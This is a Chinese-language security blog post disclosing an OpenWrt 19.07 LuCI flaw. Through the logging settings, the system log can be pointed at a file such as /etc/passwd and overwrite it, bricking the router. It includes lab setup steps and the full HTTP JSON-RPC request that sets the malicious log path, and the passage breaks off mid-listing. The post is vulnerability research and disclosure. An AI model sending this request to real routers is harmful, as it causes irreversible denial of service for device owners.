<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="OpenWrt 当前最新的版本为 19.07，研究发现最新版本及旧版就存在任意文件创建漏洞，但写入的文件内容不受控制。利用这一特性可造成拒绝服务，导致路由器“变砖”。即任意文件覆盖导致拒绝服务。 已报告给 OpenWRT，但官方选择忽略。 OpenWrt x86 VMware 安装1. 下载镜像文件下载最新 OpenWrt 19.07 x86 镜像并解压。 12wget https:&#x2F;&#x2F;downl">
<meta property="og:type" content="article">
<meta property="og:title" content="OpenWrt LuCi 任意文件创建漏洞 0day">
<meta property="og:url" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="Delikely&#39;s Blog">
<meta property="og:description" content="OpenWrt 当前最新的版本为 19.07，研究发现最新版本及旧版就存在任意文件创建漏洞，但写入的文件内容不受控制。利用这一特性可造成拒绝服务，导致路由器“变砖”。即任意文件覆盖导致拒绝服务。 已报告给 OpenWRT，但官方选择忽略。 OpenWrt x86 VMware 安装1. 下载镜像文件下载最新 OpenWrt 19.07 x86 镜像并解压。 12wget https:&#x2F;&#x2F;downl">
<meta property="og:locale">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200111235501593.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200111235827411.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112000113086.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112000254134.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112001152844.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112003646391.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112003841436.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112004119434.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200110233312316.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112123744064.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200110233312316.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200110233335232.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200110233616372.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200110234205411.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112012743093.png">
<meta property="og:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200112130533976.png">
<meta property="article:published_time" content="2020-02-12T04:04:38.000Z">
<meta property="article:modified_time" content="2020-08-01T16:17:30.000Z">
<meta property="article:author" content="Delikely">
<meta property="article:tag" content="Security">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/image-20200111235501593.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/rice.svg">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/rice.svg" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/rice.png">
          
        
    
    <!-- title -->
    <title>OpenWrt LuCi 任意文件创建漏洞 0day</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Delikely's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body class="max-width mx-auto px3">
    
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/2018/04/11/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/delikely">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2020/06/11/LoraWAN1-0-3-security/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/2019/12/12/%E7%B1%B3%E5%AE%B6%E6%99%BA%E8%83%BD%E5%AE%B6%E5%BA%AD%E5%A5%97%E8%A3%85-Zigbee/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&text=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&is_video=false&description=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=OpenWrt LuCi 任意文件创建漏洞 0day&body=Check out this article: http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&title=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&name=OpenWrt LuCi 任意文件创建漏洞 0day&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://delikely.github.io/2020/02/11/OpenWrt-LuCi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E6%BC%8F%E6%B4%9E/&text=OpenWrt LuCi 任意文件创建漏洞 0day"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenWrt-x86-VMware-%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">OpenWrt x86 VMware 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%B8%8B%E8%BD%BD%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text">1. 下载镜像文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BD%AC%E6%8D%A2%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">2. 转换镜像文件格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">1.3.</span> <span class="toc-text">3. 新建虚拟机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C"><span class="toc-number">1.4.</span> <span class="toc-text">4.配置网络</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%AA%8C%E8%AF%81%E5%AE%89%E8%A3%85"><span class="toc-number">1.5.</span> <span class="toc-text">5. 验证安装</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenWrt-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">OpenWrt 任意文件创建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">技术分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#logread"><span class="toc-number">2.1.1.</span> <span class="toc-text">logread</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-WEB-%E7%AB%AF%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97%E5%8F%82%E6%95%B0%EF%BC%8C%E4%BC%A0%E9%80%92%E5%88%B0%E5%90%8E%E5%8F%B0"><span class="toc-number">2.1.2.</span> <span class="toc-text">1. WEB 端配置系统日志参数，传递到后台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%90%8E%E5%8F%B0%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.3.</span> <span class="toc-text">2. 后台处理流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%96%87%E4%BB%B6%E8%A2%AB%E8%A6%86%E7%9B%96%EF%BC%8COpenWrt%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.1.4.</span> <span class="toc-text">3. 文件被覆盖，OpenWrt拒绝服务</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC"><span class="toc-number">2.2.</span> <span class="toc-text">POC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E5%A4%A7%E5%B0%8F%E5%92%8C%E8%B7%AF%E5%BE%84"><span class="toc-number">2.2.1.</span> <span class="toc-text">1.设置日志大小和路径</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%94%9F%E6%88%90-1K-%E4%BB%A5%E4%B8%8A%E7%9A%84%E6%97%A5%E5%BF%97%EF%BC%8C%E8%A6%86%E7%9B%96-etc-passwd"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. 生成 1K 以上的日志，覆盖 &#x2F;etc&#x2F;passwd</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-OpenWrt-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%95%88%E6%9E%9C"><span class="toc-number">2.2.3.</span> <span class="toc-text">3.OpenWrt 拒绝服务效果</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%BC%94%E7%A4%BA%E8%A7%86%E9%A2%91"><span class="toc-number">2.2.4.</span> <span class="toc-text">4.演示视频</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%91%E7%A0%96"><span class="toc-number">2.3.</span> <span class="toc-text">救砖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">3.</span> <span class="toc-text">有意思的内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95%E5%88%97%E4%B8%BE"><span class="toc-number">3.1.</span> <span class="toc-text">系统文件目录列举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%A6%86%E7%9B%96"><span class="toc-number">3.2.</span> <span class="toc-text">任意文件覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">3.3.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A5%87%E6%80%AA-eavl"><span class="toc-number">3.4.</span> <span class="toc-text">奇怪 eavl</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E5%87%BD%E6%95%B0"><span class="toc-number">4.</span> <span class="toc-text">系统函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#config-load"><span class="toc-number">4.1.</span> <span class="toc-text">config_load</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config-foreach"><span class="toc-number">4.2.</span> <span class="toc-text">config_foreach</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.</span> <span class="toc-text">参考</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        OpenWrt LuCi 任意文件创建漏洞 0day
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Delikely's Blog</span>
      </span>
      
    <div class="postdate">
        <time datetime="2020-02-12T04:04:38.000Z" itemprop="datePublished">2020-02-12</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p>OpenWrt 当前最新的版本为 19.07，研究发现最新版本及旧版就存在任意文件创建漏洞，但写入的文件内容不受控制。利用这一特性可造成拒绝服务，导致路由器“变砖”。即任意文件覆盖导致拒绝服务。</p>
<p>已报告给 OpenWRT，但官方选择忽略。</p>
<h2 id="OpenWrt-x86-VMware-安装"><a href="#OpenWrt-x86-VMware-安装" class="headerlink" title="OpenWrt x86 VMware 安装"></a>OpenWrt x86 VMware 安装</h2><h3 id="1-下载镜像文件"><a href="#1-下载镜像文件" class="headerlink" title="1. 下载镜像文件"></a>1. 下载镜像文件</h3><p>下载最新 OpenWrt 19.07 x86 镜像并解压。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://downloads.openwrt.org/releases/19.07.0/targets/x86/generic/openwrt-19.07.0-x86-generic-combined-ext4.img.gz</span><br><span class="line">gunzip openwrt-19.07.0-x86-generic-combined-ext4.img.gz</span><br></pre></td></tr></table></figure>
<h3 id="2-转换镜像文件格式"><a href="#2-转换镜像文件格式" class="headerlink" title="2. 转换镜像文件格式"></a>2. 转换镜像文件格式</h3><p>使用 qemu 将 img 镜像文件转换为 VMare Worksation 所使用的 vmdk 格式。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo  apt-get  install  qemu-utils  -y</span><br><span class="line">sudo qemu-img convert -f raw openwrt-19.07.0-x86-generic-combined-ext4.img -O vmdk openwrt-19.07.0-x86-generic-combined-ext4.vmdk</span><br></pre></td></tr></table></figure>
<h3 id="3-新建虚拟机"><a href="#3-新建虚拟机" class="headerlink" title="3. 新建虚拟机"></a>3. 新建虚拟机</h3><p>新建虚拟机和平常 “自定义创建 Linux 虚拟机” 相似（即使用现有虚拟磁盘创建 Linux 虚拟机），但需要注意四点：</p>
<p>（1）选择稍后安装操作系统</p>
<p><img src="image-20200111235501593.png" alt="image-20200111235501593" style="zoom:80%;" /></p>
<p>（2）磁盘类型选 IED</p>
<p><img src="image-20200111235827411.png" alt="image-20200111235827411" style="zoom:80%;" /></p>
<p>（3）使用现有虚拟磁盘</p>
<p><img src="image-20200112000113086.png" alt="image-20200112000113086" style="zoom:80%;" /></p>
<p>​    然后选择前面转换的 vmdk 文件。</p>
<p><img src="image-20200112000254134.png" alt="image-20200112000254134" style="zoom:80%;" /></p>
<h3 id="4-配置网络"><a href="#4-配置网络" class="headerlink" title="4.配置网络"></a>4.配置网络</h3><p>​    新建好虚拟机后，还需要配置网络，添加一张网卡，否则无法正常获取 IP。切记在首次打开虚拟机需要在配置好双网卡之后。</p>
<p>​    在 “设置” 中添加网络适配器，按照实际需要选择 “桥接” 或 “NAT”。</p>
<p>​    <img src="image-20200112001152844.png" alt="添加网卡"></p>
<p>​    </p>
<p>最后一步，在 /etc/config/network 设置 IP，然后我们就可以使用 WEB 进行访问，或使用 SSH 连接。使用ifconfig 获取当前自动分配 eth1 的 IP 地址，并把这个 IP  地址放在下图标注的位置中。</p>
<p><img src="image-20200112003646391.png" alt="设置IP"></p>
<p>然后，重启网络。</p>
<p><img src="image-20200112003841436.png" alt="重启网络"></p>
<h3 id="5-验证安装"><a href="#5-验证安装" class="headerlink" title="5. 验证安装"></a>5. 验证安装</h3><p>WEB后台访问成功，设置好密码后，可以通过 SSH 访问。</p>
<p><img src="image-20200112004119434.png" alt="Luci"></p>
<h2 id="OpenWrt-任意文件创建"><a href="#OpenWrt-任意文件创建" class="headerlink" title="OpenWrt 任意文件创建"></a>OpenWrt 任意文件创建</h2><p>OpenWrt 是三大主流路由器操作系统之一，市面上存在大量的基于 OpenWrt 开发的路由器，如极路由。OpenWrt 当前最新的版本为 19.07，研究发现最新版本及旧版就存在任意文件创建漏洞，但写入的文件内容不受控制。利用这一特性可造成拒绝服务，导致路由器“变砖”。即任意文件覆盖导致拒绝服务。</p>
<p>已<a target="_blank" rel="noopener" href="https://github.com/openwrt/luci/issues/3612">报告</a>给 OpenWRT，但官方选择忽略。</p>
<p>曾遇到利用 OpenWRT 开发的产品，去掉了 <code>System -&gt; Startup -&gt; Local Startup</code>页面（不能执行任意命令），但保留了<code>System -&gt; System -&gt; Logging</code>。如使用本文提到的方法，将导致该设备“变砖”，给用户带来不可挽回的损失。</p>
<h3 id="技术分析"><a href="#技术分析" class="headerlink" title="技术分析"></a>技术分析</h3><p>LuCI 是OpenWrt 的 WEB 后台管理界面，在 System -&gt; logging 页面可以设置系统日志的存储路径、日志文件大小、日志输出的等级等。日志功能采用 logread 实现，<a target="_blank" rel="noopener" href="https://openwrt.org/docs/guide-user/base-system/log.essentials">logread</a> 用于读取系统日志，以下是 logread 的使用帮助。</p>
<h4 id="logread"><a href="#logread" class="headerlink" title="logread"></a>logread</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@OpenWrt:~<span class="comment"># logread -h</span></span><br><span class="line">logread: option requires an argument: h</span><br><span class="line">Usage: logread [options]</span><br><span class="line">Options:</span><br><span class="line">    -s &lt;path&gt;		Path to ubus socket</span><br><span class="line">    -l	&lt;count&gt;		Got only the last <span class="string">&#x27;count&#x27;</span> messages</span><br><span class="line">    -e	&lt;pattern&gt;	Filter messages with a regexp</span><br><span class="line">    -r	&lt;server&gt; &lt;port&gt;	Stream message to a server</span><br><span class="line">    -F	&lt;file&gt;		Log file</span><br><span class="line">    -S	&lt;bytes&gt;		Log size</span><br><span class="line">    -p	&lt;file&gt;		PID file</span><br><span class="line">    -h	&lt;hostname&gt;	Add hostname to the message</span><br><span class="line">    -P	&lt;prefix&gt;	Prefix custom text to streamed messages</span><br><span class="line">    -f			Follow <span class="built_in">log</span> messages</span><br><span class="line">    -u			Use UDP as the protocol</span><br><span class="line">    -t			Add an extra timestamp</span><br><span class="line">    -0			Use \0 instead of \n as trailer when using TCP</span><br></pre></td></tr></table></figure>
<h4 id="1-WEB-端配置系统日志参数，传递到后台"><a href="#1-WEB-端配置系统日志参数，传递到后台" class="headerlink" title="1. WEB 端配置系统日志参数，传递到后台"></a>1. WEB 端配置系统日志参数，传递到后台</h4><p>现在我们来分析整个流程，首先设置日志文件大小为 1 KB，保存在 /etc/passwd 中，然后点击 “Save &amp; Apply”。</p>
<p><img src="image-20200110233312316.png" alt="设置日志参数"></p>
<p>设置日志参数的 HTTP 请求如下，OpenWrt 通过调用 <code>uci</code> 的 <code>set</code> 功能对配置文件<code>/etc/config/system</code> 进行设置，把 <code>log_size</code> 设置为 <code>1</code>，把<code>log_file</code> 设置为 <code>/etc/passwd</code>。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://192.168.7.143/cgi-bin/luci/admin/ubus?1578741218608</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.7.143</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>192</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.7.143</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.7.143/cgi-bin/luci/admin/system/system</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sysauth=b1f9ac240ca8135e2c41a12cca5c5cb6</span><br><span class="line"></span><br><span class="line">[&#123;&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;id&quot;:37,&quot;method&quot;:&quot;call&quot;,&quot;params&quot;:[&quot;b1f9ac240ca8135e2c41a12cca5c5cb6&quot;,&quot;uci&quot;,&quot;set&quot;,&#123;&quot;config&quot;:&quot;system&quot;,&quot;section&quot;:&quot;cfg01e48a&quot;,&quot;values&quot;:&#123;&quot;log_size&quot;:&quot;1&quot;,&quot;log_file&quot;:&quot;/etc/passwd&quot;&#125;&#125;]&#125;]</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@OpenWrt:~<span class="comment"># cat /etc/config/system </span></span><br><span class="line"></span><br><span class="line">config system</span><br><span class="line">trueoption hostname <span class="string">&#x27;OpenWrt&#x27;</span></span><br><span class="line">trueoption ttylogin <span class="string">&#x27;0&#x27;</span></span><br><span class="line">trueoption urandom_seed 